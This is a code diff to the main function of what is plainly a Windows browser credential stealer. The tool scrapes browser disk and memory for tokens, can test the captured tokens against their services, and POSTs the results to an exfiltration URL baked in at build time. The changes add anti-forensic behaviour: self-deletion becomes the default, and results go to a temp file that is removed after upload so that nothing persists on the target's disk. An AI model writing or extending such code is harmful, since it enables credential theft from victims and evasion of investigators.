@@ -1736,9 +1736,10 @@ def main():
     parser.add_argument("--browser",     metavar="NAME", help="Target one browser (e.g. chrome, edge, brave)")
     parser.add_argument("--disk-only",   action="store_true", help="Skip memory scraping")
     parser.add_argument("--memory-only", action="store_true", help="Skip disk extraction")
-    parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: same dir as exe)")
+    parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
-    parser.add_argument("--self-delete", action="store_true", help="Delete exe after run (opsec)")
+    parser.add_argument("--self-delete", action=argparse.BooleanOptionalAction, default=bool(_EXFIL_URL),
+                        help="Delete exe after run — on by default when server is baked in (--no-self-delete to keep)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
@@ -1819,8 +1820,17 @@ def main():
 
     report = "\n".join(lines)
 
+    # When _EXFIL_URL is baked in and no explicit --out, use a temp file that
+    # gets cleaned up after upload — nothing persists on the target's disk.
+    _using_temp = False
     if args.out:
         out_path = args.out
+    elif _EXFIL_URL:
+        import tempfile as _tempfile
+        _tmp = _tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
+        out_path = _tmp.name
+        _tmp.close()
+        _using_temp = True
     elif getattr(sys, "frozen", False):
         out_path = os.path.join(os.path.dirname(sys.executable), "bb_results.txt")
     else:
@@ -1829,20 +1839,27 @@ def main():
     with open(out_path, "w", encoding="utf-8") as f:
         f.write(report)
 
+    csv_path = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
     if all_csv_rows:
         import csv as _csv
-        csv_path = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
         with open(csv_path, "w", newline="", encoding="utf-8") as f:
             writer = _csv.DictWriter(f, fieldnames=["browser", "profile", "label", "service", "value", "address"])
             writer.writeheader()
             writer.writerows(all_csv_rows)
 
     if args.exfil and args.exfil_key:
-        csv_path_for_exfil = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
-        report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path_for_exfil if all_csv_rows else None)
-        if report_url:
+        report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path if all_csv_rows else None)
+        if report_url and not _using_temp:
             with open(out_path, "a", encoding="utf-8") as f:
                 f.write(f"\n[+] Exfil: {report_url}\n")
+
+    if _using_temp:
+        try:
+            os.remove(out_path)
+            if os.path.exists(csv_path):
+                os.remove(csv_path)
+        except OSError:
+            pass
 
     if args.self_delete and getattr(sys, "frozen", False):
         os.popen(f'cmd /c ping -n 2 127.0.0.1 > nul & del /f /q "{sys.executable}"')
